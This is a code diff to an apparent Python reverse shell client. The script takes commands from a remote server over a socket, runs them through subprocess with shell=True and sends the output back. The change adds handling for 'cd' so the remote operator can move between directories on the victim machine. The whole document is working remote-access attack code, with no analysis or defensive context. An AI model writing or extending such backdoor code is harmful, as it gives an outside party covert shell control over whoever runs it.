@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import os
 
 # Forms connection to server with IP and port
 def session_handler():
@@ -16,11 +17,16 @@ def session_handler():
                     print('[+] Connection closed from remote host')
                     sock.close()
                     break
+                elif message.split(" ")[0] == 'cd':
+                    directory = str(message.split(" ")[1])
+                    os.chdir(directory)
+                    cur_dir = os.getcwd()
+                    print(f'[+] Changed to - {cur_dir}')
+                    sock.send(cur_dir.encode())
                 else:
                     command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                     output = command.stdout.read() + command.stderr.read()
                     sock.send(output)
-
 
             except KeyboardInterrupt:
                 print("\n[+] Keyboard Interrupt Issued")
